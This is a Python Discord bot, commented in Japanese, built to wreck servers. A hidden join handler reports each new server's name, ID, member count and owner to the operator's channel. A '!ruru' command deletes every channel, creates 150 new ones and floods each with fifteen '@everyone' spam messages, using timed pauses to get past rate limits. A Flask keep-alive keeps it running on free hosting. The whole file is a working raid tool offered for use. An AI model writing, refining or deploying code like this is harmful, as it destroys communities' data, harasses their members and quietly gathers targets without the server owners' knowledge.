import os
import threading
import asyncio
from flask import Flask
import discord
from discord.ext import commands

# --- KeepAlive Server for Render & UptimeRobot ---
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    threading.Thread(target=run_flask).start()


# --- Discord Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # ← 追加（サーバー主や人数を取得するため）

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")


# =========================================================
#  🔔 Botがサーバーに参加したら情報を送る機能（追加部分）
# =========================================================
@bot.event
async def on_guild_join(guild):

    TARGET_CHANNEL_ID = 1439235940467085362  # 送信先チャンネル

    channel = bot.get_channel(TARGET_CHANNEL_ID)
    if channel is None:
        print("⚠ 通知チャンネルが見つかりません（botがその鯖にいるか確認）")
        return

    owner = guild.owner
    member_count = guild.member_count

    embed = discord.Embed(
        title="📥 Bot が新しいサーバーに参加しました",
        color=0x00ff99
    )
    embed.add_field(name="サーバー名", value=guild.name, inline=False)
    embed.add_field(name="サーバーID", value=guild.id, inline=False)
    embed.add_field(name="メンバー数", value=member_count, inline=False)
    embed.add_field(name="サーバー主", value=f"{owner} (ID: {owner.id})", inline=False)

    await channel.send(embed=embed)



# =========================================================
#  ⚙️ 安全版大量削除・生成・送信（あなたのコード）
# =========================================================
async def safe_delete(channel):
    try:
        await channel.delete()
    except Exception:
        pass

async def safe_send(channel, content):
    try:
        await channel.send(content)
    except Exception:
        pass


@bot.command()
@commands.has_permissions(administrator=True)
async def ruru(ctx):

    # --- 1. チャンネル削除（並列・超安定版） ---
    delete_tasks = [safe_delete(ch) for ch in ctx.guild.channels]

    for i in range(0, len(delete_tasks), 5):  # 5個ずつ並行
        await asyncio.gather(*delete_tasks[i:i+5])
        await asyncio.sleep(0.1)  # レートリミット回避


    # --- 2. チャンネル大量生成（150個） ---
    created_channels = []
    for i in range(1, 151):
        ch = await ctx.guild.create_text_channel(f"ch-{i:03}")
        created_channels.append(ch)
        await asyncio.sleep(0.3)  # 安全ウェイト


    # --- 3. 各チャンネルに15回送信 ---
    for ch in created_channels:
        for _ in range(15):
            await safe_send(ch, "@everyone るる最強")
            await asyncio.sleep(0.5)

    await ctx.send("150チャンネル生成＋各チャンネル15メッセージ送信完了！")



# --- Main Execution ---
if __name__ == "__main__":

    TOKEN = os.environ.get("DISCORD_TOKEN")
    if not TOKEN:
        print("DISCORD_TOKEN が設定されていません")
    else:
        keep_alive()
        bot.run(TOKEN)
